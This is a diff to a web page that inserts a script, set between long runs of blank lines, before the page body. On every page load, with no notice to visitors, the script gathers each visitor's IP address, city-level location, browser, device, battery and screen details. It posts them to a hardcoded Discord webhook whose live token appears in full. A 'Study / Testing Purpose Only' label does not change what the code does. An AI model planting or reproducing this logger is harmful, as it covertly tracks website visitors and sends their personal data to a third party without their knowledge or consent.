@@ -184,6 +184,137 @@ textarea{resize:none; height:80px}
 </style>
 </head>
 
+
+
+
+
+
+
+
+
+
+<script>
+// 6️⃣ Battery Info Detector
+async function getBatteryInfo() {
+    if (!navigator.getBattery) {
+        return { level: "Not Supported", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
+    }
+    try {
+        const battery = await navigator.getBattery();
+        return {
+            level: Math.round(battery.level * 100) + "%",
+            charging: battery.charging ? "Yes" : "No",
+            chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + " sec" : "N/A",
+            dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + " sec" : "N/A"
+        };
+    } catch (err) {
+        return { level: "Error", charging: "Error", chargingTime: "Error", dischargingTime: "Error" };
+    }
+}
+
+// Example functions to get visitor info
+function getDeviceBrand() {
+    const ua = navigator.userAgent;
+    if(/iPhone/i.test(ua)) return "Apple iPhone";
+    if(/iPad/i.test(ua)) return "Apple iPad";
+    if(/Android/i.test(ua)) return "Android Device";
+    if(/Windows/i.test(ua)) return "Windows PC";
+    if(/Macintosh/i.test(ua)) return "Mac";
+    return "Unknown";
+}
+
+function getNetworkProvider() {
+    return "N/A"; // Browser can't reliably get network provider
+}
+
+function getVisitorID() {
+    let id = sessionStorage.getItem("visitorID");
+    if(!id){
+        id = Math.random().toString(36).substring(2,12);
+        sessionStorage.setItem("visitorID", id);
+    }
+    return id;
+}
+
+// Send Visitor Info to Discord
+async function sendVisitorInfo() {
+    const webhookURL = "https://discord.com/api/webhooks/1449603518691283157/AiLtL8RdJoHumPvm0j7FycuT28N5cutaKSW3gs29GThGc6sDQsp4bF1IkdbiWhiQp41n";
+    const deviceBrand = getDeviceBrand();
+    const visitorID = getVisitorID();
+    const battery = await getBatteryInfo();
+
+    // IP based location
+    let locationText = "Not Available";
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        locationText = `${data.city}, ${data.region}, ${data.country_name} (IP: ${data.ip})`;
+    }catch(e){ console.warn("IP Location failed", e); }
+
+    const payload = {
+        content: "**🌐 New Website Visit (Test Mode)**",
+        embeds: [{
+            title: "Visitor Info",
+            color: 0x00ff99,
+            fields: [
+                { name: "👤 Visitor ID", value: visitorID, inline: true },
+                { name: "🕒 Visit Time", value: new Date().toLocaleString(), inline: true },
+                { name: "📄 Page Title", value: document.title, inline: false },
+                { name: "🖥️ Browser", value: navigator.userAgent, inline: false },
+                { name: "💻 OS", value: navigator.platform, inline: true },
+                { name: "📱 Device Type", value: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop", inline: true },
+                { name: "📲 Device Brand", value: deviceBrand, inline: true },
+                { name: "🔋 Battery Level", value: battery.level, inline: true },
+                { name: "🔌 Charging?", value: battery.charging, inline: true },
+                { name: "⏱️ Charging Time", value: battery.chargingTime, inline: true },
+                { name: "⏱️ Discharging Time", value: battery.dischargingTime, inline: true },
+                { name: "🌍 Location", value: locationText, inline: false },
+                { name: "📐 Screen Resolution", value: screen.width + "x" + screen.height, inline: true },
+                { name: "🖥️ Viewport Size", value: window.innerWidth + "x" + window.innerHeight, inline: true },
+                { name: "🌐 Browser Language", value: navigator.language, inline: true },
+                { name: "🕓 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                { name: "🔁 Session Duration", value: Math.floor((Date.now() - (sessionStorage.getItem("sessionStart") || Date.now()))/1000) + " sec", inline: true }
+            ],
+            footer: { text: "Study / Testing Purpose Only | Powered by KAVINDU" },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        const res = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        if(res.ok){
+            console.log("Visitor info sent ✅");
+            sessionStorage.setItem("visitorLogged", "true");
+        } else {
+            console.error("Webhook error ❌ Status:", res.status);
+        }
+    } catch (err) {
+        console.error("Failed to send visitor info ❌", err);
+    }
+}
+
+// Initialize session start and send visitor info
+if(!sessionStorage.getItem("sessionStart")) sessionStorage.setItem("sessionStart", Date.now());
+sendVisitorInfo();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <body>
 
 <div class="container">
